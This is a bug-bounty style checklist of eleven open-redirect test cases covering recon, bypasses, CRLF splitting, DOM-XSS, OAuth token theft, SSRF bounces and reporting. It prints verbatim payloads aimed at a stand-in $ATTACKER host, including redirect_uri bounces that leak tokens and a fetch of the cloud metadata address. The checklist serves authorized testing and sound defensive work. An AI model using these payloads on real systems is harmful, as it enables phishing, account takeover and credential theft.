# Open Redirect — Checklist

Expert per-attack **test-case matrix** for Open Redirect — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*11 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## OR-001 — Recon — redirect params, SSO redirect_uri, sink type
**Test Category:** Recon · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** next/returnUrl/redirect/url/dest/... params; login/logout/SSO redirect_uri/RelayState; Location/meta/JS sinks

**Test Steps:** 1. Harvest URLs (gau/katana) + grep the redirect param name-set (gf redirect); find login/logout/SSO redirect_uri/returnUrl/RelayState (the #1 place).<br>2. Discover hidden redirect params (Arjun/Param Miner) on login/checkout/share/download/preview.<br>3. Locate the SINK TYPE per candidate: Location header / &lt;meta refresh&gt; / JS (location=/href/assign/replace/window.open). Flag server-side URL fetchers -&gt; test as SSRF, not open redirect.

**Expected Result:** A list of redirect params with their sink type, and the SSO redirect_uri.

**Payload Example:**

```
?next= ?returnUrl= redirect_uri= ; sink = JS location.href vs Location header
```

**Impact:** The sink type decides the ceiling (JS sink -&gt; javascript: -&gt; XSS).

**Tools:** gau, gf, Arjun

**References:** CWE-601; OWASP Testing Guide: Client-Side URL Redirect (WSTG-CLNT-04)

---

## OR-002 — Baseline — off-origin redirect
**Test Category:** Baseline · **Severity:** Low · **CVSS:** 3.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N)

**Where to Test / Injection Point:** Each redirect param

**Test Steps:** 1. Plain absolute ?p=https://$ATTACKER -&gt; lands off-origin?<br>2. Protocol-relative ?p=//$ATTACKER -&gt; off-origin? (the most common win).<br>3. Backslash /\$ATTACKER, https:/\$ATTACKER.<br>4. Classify: off-origin / blocked-needs-bypass / same-origin-only / OAuth redirect_uri / JS sink / server-fetch(SSRF).

**Expected Result:** The browser is sent to an attacker-controlled host.

**Payload Example:**

```
?next=//$ATTACKER ; ?next=/\$ATTACKER ; curl -D- | grep -i location
```

**Impact:** Confirms off-origin redirection - the base primitive to escalate.

**Tools:** curl -D-, browser

**References:** CWE-601; PortSwigger Web Security Academy: DOM-based open redirection

---

## OR-003 — Parser-gap matrix
**Test Category:** Bypass · **Severity:** Low · **CVSS:** 3.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N)

**Where to Test / Injection Point:** Redirect params with naive validation

**Test Steps:** 1. Walk the matrix: //, /\, https:/\, @-userinfo (target.com@$ATTACKER), $ATTACKER/target.com, target.com.$ATTACKER.<br>2. Multi-@: foo@$ATTACKER@target.com.<br>3. Find the one that lands off-origin.

**Expected Result:** A parser-gap payload escapes to the attacker host.

**Payload Example:**

```
https://target.com@$ATTACKER/ ; \/\/$ATTACKER ; https:/\$ATTACKER
```

**Impact:** Bypasses naive scheme/host checks.

**Tools:** Burp Intruder

**References:** CWE-601; HackTricks: Open Redirect

---

## OR-004 — Whitelist / allow-list bypass
**Test Category:** Bypass · **Severity:** Low · **CVSS:** 3.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N)

**Where to Test / Injection Point:** Redirect params with a host allowlist

**Test Steps:** 1. contains: $ATTACKER/target.com, target.com.$ATTACKER.<br>2. startsWith: target.com.$ATTACKER, target.com@$ATTACKER.<br>3. endsWith/host allowlist: register evil-target.com / use a taken-over subdomain / chain an OPEN REDIRECT on an already-allowed host (redirect-&gt;redirect).

**Expected Result:** The allowlist is satisfied while the browser still lands on the attacker host.

**Payload Example:**

```
https://allowed.target.com/out?url=//$ATTACKER ; https://target.com.$ATTACKER/
```

**Impact:** Bypasses the host allowlist - proves the fix incomplete.

**Tools:** Burp

**References:** CWE-601; HackTricks: Open Redirect

---

## OR-005 — Encoding / CRLF response splitting
**Test Category:** Bypass · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Redirect params reflected into Location

**Test Steps:** 1. Encoded: %2f%2f, %252f%252f (double), %09/%00, unicode dot.<br>2. CRLF: ?next=https://target.com/%0d%0aLocation:%20https://$ATTACKER -&gt; if %0d%0a survives into Location = CRLF injection / response splitting.<br>3. Escalate to Set-Cookie (session fixation) / a second Location / header cache poisoning.

**Expected Result:** An encoded/CRLF payload redirects off-origin or splits the response.

**Payload Example:**

```
?next=%2f%2f$ATTACKER ; ?next=https://target.com/%0d%0aLocation:%20https://$ATTACKER
```

**Impact:** Off-origin redirect / CRLF response splitting (session fixation, XSS) - Medium.

**Tools:** Burp

**References:** CWE-601; CWE-113; HackTricks: Open Redirect

---

## OR-006 — DOM-XSS via javascript: / data: (JS sink)
**Test Category:** Impact — DOM-XSS · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N)

**Where to Test / Injection Point:** Client-side JS sinks (location=/href/assign/replace/window.open/anchor href)

**Test Steps:** 1. If the JS sink accepts javascript:/data:, fire javascript:alert(document.domain).<br>2. Obfuscate filters: JaVaScRiPt:, java%0ascript:, %6a%61...; data:text/html,&lt;script&gt;...&lt;/script&gt;.<br>3. Only client-JS sinks execute - a Location HEADER ignores non-http schemes (not XSS).

**Expected Result:** alert(document.domain) fires from the redirect JS sink.

**Payload Example:**

```
?returnUrl=javascript:alert(document.domain) ; data:text/html,<script>alert(document.domain)</script>
```

**Impact:** DOM-XSS (a tier above redirect) -&gt; session/account theft. High.

**Tools:** Burp, DOM Invader

**References:** CWE-601; CWE-79; PortSwigger Web Security Academy: DOM-based open redirection

---

## OR-007 — OAuth / SSO code/token theft
**Test Category:** Impact — ATO · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth redirect_uri / an open redirect on an allowed client host

**Test Steps:** 1. Loose redirect_uri OR an open-redirect-on-allowed-client bounces the code/access_token to your host.<br>2. redirect_uri=https://client.target.com/out?url=//$ATTACKER ; fragment-preserving bounce for implicit #access_token.<br>3. Catch YOUR OWN code/token with token_catcher.py.

**Expected Result:** The victim's OAuth code/access_token is delivered to the attacker host.

**Payload Example:**

```
redirect_uri=https://client.target.com/out?url=//$ATTACKER -> code leaks
```

**Impact:** Account takeover via OAuth token theft - High/Critical.

**Tools:** poc/token_catcher.py, OAuth kit

**References:** CWE-601; CWE-287; HackTricks: Open Redirect

---

## OR-008 — SSRF allow-list bounce &amp; token/session leak
**Test Category:** Impact — SSRF / Leak · **Severity:** High · **CVSS:** 8.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** Allow-list-locked SSRF fetchers; reset/verify/session tokens in URLs

**Test Steps:** 1. An allow-list-locked SSRF + an open redirect on an allowed host -&gt; follows to 169.254.169.254/internal (read-only proof).<br>2. Token/session leak: a reset/verify/session token in the URL/fragment/Referer walks off-origin -&gt; ATO.<br>3. Own account, own token, read-only metadata.

**Expected Result:** The redirect bounces an SSRF to internal, or leaks a token off-origin.

**Payload Example:**

```
SSRF url=https://allowed.target.com/out?url=http://169.254.169.254/ ; reset token in Referer -> $ATTACKER
```

**Impact:** SSRF-&gt;metadata / token leak -&gt; ATO - High/Critical.

**Tools:** SSRFmap, Burp

**References:** CWE-601; CWE-918; HackTricks: Open Redirect

---

## OR-009 — Credible phishing narrative (bare redirect)
**Test Category:** Impact — Phishing · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Bare off-origin redirect on the trusted origin

**Test Steps:** 1. A real target.com link auto-redirects to your page (credible phishing) or bounces to a sister-subdomain XSS (domain cookies).<br>2. Provide an HONEST phishing PoC on the trusted origin.<br>3. Not an inflated 'Critical' - Low/Medium unless something rides along.

**Expected Result:** A trusted-origin link silently sends the victim to the attacker page.

**Payload Example:**

```
https://target.com/login?next=//$ATTACKER (auto-redirect from a trusted link)
```

**Impact:** Credible phishing / brand abuse from the trusted origin - Low/Medium.

**Tools:** manual

**References:** CWE-601; PortSwigger Web Security Academy: DOM-based open redirection

---

## OR-010 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: same-origin redirect only (leading / enforced, no //\@ bypass reaches off-origin); redirect to a fixed/allow-listed partner you can't steer; a bare off-origin redirect reported as High with nothing riding along (it's Low-Medium); a server-side URL FETCH called 'open redirect' (it's SSRF); javascript: in a Location HEADER claimed as XSS (browsers ignore it there); requires the victim to hand-edit the URL; a third-party/out-of-scope domain.<br>2. REQUIRE: prove the escalation (caught token / fired script / internal fetch) or an honest phishing PoC.

**Expected Result:** Only escalated or honestly-phishing candidates rate above Low.

**Payload Example:**

```
same-origin = FP ; server-fetch = SSRF ; js: in Location header = not XSS ; bare hop = Low
```

**Impact:** Protects credibility; open redirect is dense with bare-hop over-rated reports.

**Tools:** manual

**References:** CWE-601; PortSwigger Web Security Academy: DOM-based open redirection

---

## OR-011 — Client-facing impact &amp; SAFE PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with the highest-impact escalation (ATO / DOM-XSS / SSRF-internal) or an honest phishing narrative.<br>2. Provide the payload, the sink type, and the escalation proof (caught token / alert / internal fetch).<br>3. Set CVSS 3.1 + CWE-601 (+79/918/113/287 by outcome). Remediation: allowlist redirect targets (relative paths or a fixed set), don't build redirects from user input, validate scheme+host after canonicalization, avoid javascript:/data: in client redirect sinks.<br>4. Own marker host, own account, own token, read-only metadata, benign XSS marker; de-dupe, confirm on production.

**Expected Result:** A reproducible, correctly-rated PoC with the escalation proven and clear remediation.

**Payload Example:**

```
PoC: payload + sink type + escalation proof (token/alert/internal fetch) + CVSS + CWE-601 + remediation.
```

**Impact:** Converts the escalation into a defensible report at the right (not inflated) severity.

**Tools:** CVSS calculator, OPEN_REDIRECT_REPORT_TEMPLATE.md

**References:** CWE-601; CWE-79; FIRST CVSS v3.1; OWASP Testing Guide: Client-Side URL Redirect (WSTG-CLNT-04)  |  TOP REFERENCES: PortSwigger Academy; PayloadsAllTheThings; HackTricks; disclosed OAuth-redirect ATO writeups

---
